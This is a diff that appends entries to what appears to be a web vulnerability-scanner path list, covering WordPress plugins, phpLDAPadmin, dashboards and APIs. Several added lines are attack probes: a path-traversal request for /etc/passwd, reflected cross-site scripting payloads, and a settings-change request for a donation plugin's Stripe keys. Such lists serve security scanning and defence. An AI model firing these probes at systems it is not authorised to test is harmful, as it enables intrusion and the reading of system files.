@@ -116,3 +116,15 @@ preview.php?controller=Load&action=index&catid=moztj%22%3E%3Cscript%3Ealert(docu
 /wp-content/plugins/qwiz-online-quizzes-and-flashcards/qwiz_admin_sample_buttons.php?theme_stylesheet=\
 /wp-content/uploads/fifu-plugin.log
 /wp-content/uploads/fifu-cloud.log
+/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
+/phpldapadmin/
+/phpldapadmin/entry_chooser.php?container=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/?static=1&order=asc
+/wp-admin/admin-post.php?page=give-settings&stripe_publishable_key={{stripe_publishable_key}}&stripe_publishable_key_test={{stripe_publishable_key_test}}&stripe_user_id={{stripe_user_id}}&stripe_access_token={{stripe_access_token}}&stripe_access_token_test={{stripe_access_token_test}}&connected=1
+/?cf-api=%22%20style=position:fixed;left:0;top:0;right:0;bottom:0;%20onmouseover=alert(1)%20x
+/wp-json/tribe/events/v1/organizers
+/wp-json/tribe/events/v1/venues
+/dashboard/
+/lightstreamer/dashboard/
+/service/rest/v1/repositories
+/api/tags
